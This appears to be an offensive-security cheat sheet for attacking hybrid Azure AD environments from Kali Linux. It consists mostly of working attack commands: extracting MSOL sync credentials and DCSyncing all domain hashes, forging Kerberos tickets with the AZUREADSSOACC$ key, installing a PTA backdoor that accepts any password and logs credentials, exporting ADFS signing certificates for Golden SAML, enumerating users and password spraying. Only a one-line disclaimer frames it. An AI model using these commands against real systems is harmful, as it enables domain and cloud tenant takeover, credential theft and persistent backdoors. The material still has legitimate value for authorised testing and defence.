---
title: "Azure AD Hybrid Attacks — From Kali"
weight: 9
tags: ["ad", "azure", "hybrid", "msol", "aad-connect", "kali"]
---

## Quick Reference

| Attack | Requirement | Impact |
|---|---|---|
| MSOL Account DCSync | Local admin on AAD Connect server | Full domain + cloud compromise |
| AZUREADSSOACC$ Abuse | DCSync rights or DA | Forge Azure AD tokens |
| PHS Hash Extraction | MSOL DCSync rights | Cloud account takeover |
| PTA Abuse | On-prem DC compromise | Transparent cloud auth bypass |
| Golden SAML | ADFS signing cert theft | Persistent cloud access |

---

## Azure AD Connect Abuse (MSOL Account)

Azure AD Connect synchronizes on-premises Active Directory to Azure AD. During setup, it creates a service account named `MSOL_xxxxxxxx` in the on-premises domain. This account is granted `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` on the domain root — the exact permissions required for DCSync. Its password is stored encrypted in a SQL LocalDB instance on the AAD Connect server.

**Attack path:** local admin on AAD Connect server → extract MSOL credentials → DCSync the domain.

---

### Enumerate the MSOL Account

```bash
# Locate MSOL_ account via ldapsearch
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(samAccountName=MSOL_*)" \
  samAccountName description whenCreated

# Verify replication rights on the domain NC
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(samAccountName=MSOL_*)" \
  samAccountName msExchMasterAccountSid
```

```bash
# Enumerate with nxc (netexec)
nxc ldap DC_IP -u USERNAME -p 'PASSWORD' -d TARGET_DOMAIN \
  --query "(samAccountName=MSOL_*)" "samAccountName description"

# Confirm DCSync-capable ACEs on domain root via bloodyAD
bloodyAD -u USERNAME -p 'PASSWORD' -d TARGET_DOMAIN \
  --host DC_IP get writable --otype DOMAIN
```

---

### Confirm Replication Rights on MSOL Account

```bash
# Dump ACL on domain root NC and filter for MSOL account
dacledit.py -action read -target "DC=TARGET_DOMAIN,DC=com" \
  TARGET_DOMAIN/USERNAME:'PASSWORD'@DC_IP 2>/dev/null | grep -i "MSOL\|DS-Replication"

# Expected: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All granted to MSOL_*
```

---

### Extract MSOL Password from AAD Connect Server

Requires local administrator (or SYSTEM) on the AAD Connect server. The password is stored in the `ADSync` SQL LocalDB instance under the `mms_management_agent` table, encrypted with DPAPI using the machine key.

#### Method 1 — AADInternals (PowerShell via pwsh on Kali)

```bash
# Install PowerShell on Kali if not present
apt-get install -y powershell

# Launch pwsh
pwsh
```

```powershell
# Inside pwsh — install AADInternals
Install-Module AADInternals -Force
Import-Module AADInternals

# Must be run on the AAD Connect server (or via PSRemoting to it)
# Retrieves SyncUser, Password, TenantId
Get-AADIntSyncCredentials
```

Expected output fields:
- `UserName` — the MSOL_ account UPN
- `Password` — plaintext password
- `TenantId` — Azure AD tenant GUID

#### Method 2 — AdDecrypt (shell on sync server required)

```bash
# AdDecrypt reads and decrypts the ADSync LocalDB
# Transfer AdDecrypt.exe to the sync server, then execute:
# AdDecrypt.exe
# It connects to the local SQL instance and decrypts with machine DPAPI key

# Alternatively pivot via secretsdump if you have local admin on the sync server
secretsdump.py TARGET_DOMAIN/SYNC_SERVER_ADMIN:'PASSWORD'@SYNC_SERVER_IP \
  -just-dc-ntlm
```

---

### Query AAD Connect SQL Directly (if shell on server)

```bash
# The ADSync database lives in SQL LocalDB
# Instance name: (localdb)\.\ADSync  or  np:\\.\pipe\LOCALDB#SHARED\tsql\query

# Via sqlcmd on the server:
# sqlcmd -S "(localdb)\.\ADSync" -Q "SELECT ma_id, private_configuration_xml FROM mms_management_agent"
# The private_configuration_xml contains the encrypted credentials blob

# Decrypt blob with DPAPI:
# [Security.Cryptography.ProtectedData]::Unprotect(...)
# AADInternals automates all of this via Get-AADIntSyncCredentials
```

---

### Use MSOL Account for DCSync

Once you have MSOL_xxxxxxxx credentials:

```bash
# Full DCSync — dump all hashes
secretsdump.py -just-dc \
  TARGET_DOMAIN/MSOL_ACCOUNT:'MSOL_PASSWORD'@DC_IP

# Target only krbtgt (for Golden Ticket)
secretsdump.py -just-dc-user krbtgt \
  TARGET_DOMAIN/MSOL_ACCOUNT:'MSOL_PASSWORD'@DC_IP

# Target Administrator hash
secretsdump.py -just-dc-user Administrator \
  TARGET_DOMAIN/MSOL_ACCOUNT:'MSOL_PASSWORD'@DC_IP

# Output format: domain/username:RID:LM_HASH:NT_HASH:::
# Use NT_HASH for PTH, or crack for password
```

---

## AZUREADSSOACC$ — Seamless SSO Kerberos Key Abuse

When Seamless Single Sign-On is enabled in AAD Connect, a computer account named `AZUREADSSOACC$` is created in the on-premises domain. Azure AD uses the Kerberos DES key of this account to decrypt service tickets presented during SSO authentication. An attacker who extracts this DES key can forge Kerberos tickets that Azure AD will accept as legitimate — enabling arbitrary cloud account impersonation.

**Attack path:** DCSync rights → dump AZUREADSSOACC$ key → forge Azure AD Kerberos tokens.

---

### Enumerate AZUREADSSOACC$

```bash
# Confirm account exists
nxc ldap DC_IP -u USERNAME -p 'PASSWORD' \
  --query "(samAccountName=AZUREADSSOACC$)" \
  "samAccountName description whenCreated msDS-SupportedEncryptionTypes"

ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(samAccountName=AZUREADSSOACC$)" \
  samAccountName description whenCreated userAccountControl msDS-SupportedEncryptionTypes
```

---

### Extract AZUREADSSOACC$ Hash via DCSync

```bash
# DCSync the AZUREADSSOACC$ computer account
# Requires DA or DCSync-capable account (e.g., the MSOL account obtained above)
secretsdump.py -just-dc-user 'AZUREADSSOACC$' \
  TARGET_DOMAIN/DA_USERNAME:'PASSWORD'@DC_IP

# With NTLM hash instead of password (PTH for secretsdump)
secretsdump.py -just-dc-user 'AZUREADSSOACC$' \
  -hashes :NTLM_HASH \
  TARGET_DOMAIN/DA_USERNAME@DC_IP

# Output includes:
# AZUREADSSOACC$:DES_KEY (this is the Kerberos DES key used for SSO)
# AZUREADSSOACC$:AES128, AES256 keys
# AZUREADSSOACC$:NT hash
```

---

### Forge Azure AD Token via AADInternals

```powershell
# In pwsh — AADInternals is needed
Import-Module AADInternals

# Retrieve target user ImmutableId (on-prem objectGuid → base64)
# Get ImmutableId from on-prem AD:
$user = Get-ADUser -Identity USERNAME -Properties objectGuid
$immutableId = [System.Convert]::ToBase64String($user.ObjectGuid.ToByteArray())
Write-Output $immutableId

# Retrieve user SID from AD
$sid = (Get-ADUser -Identity USERNAME).SID.Value

# Forge access token using the AZUREADSSOACC$ DES key
# New-AADIntKerberosTicket creates a forged Kerberos ticket for SSO
$ticket = New-AADIntKerberosTicket -SidString $sid `
  -Hash "DES_KEY_HEX" `
  -UserPrincipalName "USERNAME@TARGET_DOMAIN"

# Use ticket to get Azure AD access token
$token = Get-AADIntAccessTokenForAADGraph `
  -KerberosTicket $ticket `
  -Domain TARGET_DOMAIN

# Use token to enumerate or modify Azure AD resources
Get-AADIntUsers -AccessToken $token
```

---

## Password Hash Sync (PHS) Attack Path

When PHS is configured, AAD Connect periodically syncs NTLM/Kerberos password hashes from on-prem AD to Azure AD. The MSOL account performs a DCSync-style replication to collect these hashes.

**Attack path:** MSOL credentials → DCSync → obtain all user NT hashes → spray against cloud.

```bash
# Full hash dump via MSOL account — hashes include cloud-synced accounts
secretsdump.py -just-dc \
  TARGET_DOMAIN/MSOL_ACCOUNT:'MSOL_PASSWORD'@DC_IP \
  -outputfile phs_dump

# Filter for users (not machine accounts)
grep -v '\$$' phs_dump.ntds | head -50

# Test cloud login with obtained hash (Azure AD does not natively accept PTH —
# must crack hash and use plaintext, or use on-prem PTH where PTA is in use)
```

---

## Pass-Through Authentication (PTA) Abuse

With PTA, Azure AD forwards authentication requests to on-prem DCs via the PTA agent. Compromising the on-prem DC effectively grants control over cloud authentication.

```bash
# If you have DA / DCSync — inject a PTA backdoor via AADInternals
# This installs a PTA agent that accepts any password for any user

pwsh
```

```powershell
Import-Module AADInternals

# Authenticate as Global Admin (obtained via MSOL + cloud escalation)
$cred = Get-Credential  # GA credentials

# Install PTA agent backdoor — accepts any password for any cloud user
Install-AADIntPTASpy

# After installation — any password works for any synced user in Azure AD
# Credentials are logged: Get-AADIntPTASpyLog
```

---

## ADFS — Golden SAML Attack Path

If the environment uses Active Directory Federation Services (ADFS) for cloud SSO instead of PHS/PTA, the attack target is the ADFS token-signing certificate.

```bash
# Enumerate ADFS configuration via on-prem AD
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "CN=ADFS,CN=Microsoft,CN=Program Data,DC=TARGET_DOMAIN,DC=com" \
  "(objectClass=*)" \
  "serviceBindingInformation"

# If you have shell on ADFS server — export signing cert via ADFSDump or AADInternals
# (requires local admin on ADFS server)
```

```powershell
# On ADFS server (PowerShell):
Import-Module AADInternals

# Export ADFS configuration including token-signing cert
Export-AADIntADFSConfiguration

# Or use ADFSDump:
# ADFSDump.exe /output:c:\temp\adfs_config.json

# With signing cert extracted:
# New-AADIntSAMLToken -ImmutableID USER_IMMUTABLE_ID -Issuer ADFS_ISSUER -PfxFileName cert.pfx
```

---

## Tenant ID Enumeration

```bash
# Identify Azure AD tenant from domain (no auth required)
curl -s "https://login.microsoftonline.com/TARGET_DOMAIN/.well-known/openid-configuration" \
  | python3 -m json.tool | grep '"issuer"'
# issuer URL contains: /TENANT_ID/

# Alternative via AADInternals
pwsh -c "Import-Module AADInternals; Get-AADIntTenantID -Domain TARGET_DOMAIN"

# Enumerate tenant info
curl -s "https://login.microsoftonline.com/TARGET_DOMAIN/v2.0/.well-known/openid-configuration" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['issuer'])"
```

---

## User Enumeration via Azure AD

```bash
# Enumerate valid users via Azure AD login endpoint (no creds)
# o365creeper.py or similar tool
python3 o365creeper.py -f userlist.txt -d TARGET_DOMAIN

# Via AADInternals (no auth)
pwsh -c "
Import-Module AADInternals
Invoke-AADIntUserEnumerationAsOutsider -UserName 'USERNAME@TARGET_DOMAIN'
"

# Response includes: IsGuestUser, IsUnmanaged, IsEntraTenantDomain
# IfExistsResult: 0 = user exists, 1 = not found
```

---

## Credential Spray Against Azure AD

```bash
# Password spray via MSOLSpray (PowerShell)
pwsh -c "
Import-Module MSOLSpray
Invoke-MSOLSpray -UserList users.txt -Password 'PASSWORD' -Verbose
"

# Via trevorspray (Python — handles lockout and smart delays)
pip3 install trevorspray
trevorspray spray -u users.txt -p 'PASSWORD' --delay 30 -t TARGET_DOMAIN

# Or directly against the token endpoint
curl -s -X POST "https://login.microsoftonline.com/TARGET_DOMAIN/oauth2/token" \
  -d "resource=https://graph.microsoft.com&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&grant_type=password&username=USERNAME@TARGET_DOMAIN&password=PASSWORD" \
  | python3 -m json.tool
# access_token in response = valid credentials
```

---

## Tool Reference

| Tool | Install | Purpose |
|---|---|---|
| AADInternals | `Install-Module AADInternals` (pwsh) | MSOL extraction, PTA spy, Golden SAML, token forge |
| secretsdump.py | `impacket` (Kali built-in) | DCSync MSOL/AZUREADSSOACC$ |
| nxc (netexec) | `apt install netexec` | LDAP queries, gmsa, laps modules |
| bloodyAD | `pip3 install bloodyAD` | ACL read/write over LDAP |
| dacledit.py | `impacket` | ACL enumeration |
| trevorspray | `pip3 install trevorspray` | Azure AD password spray |

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
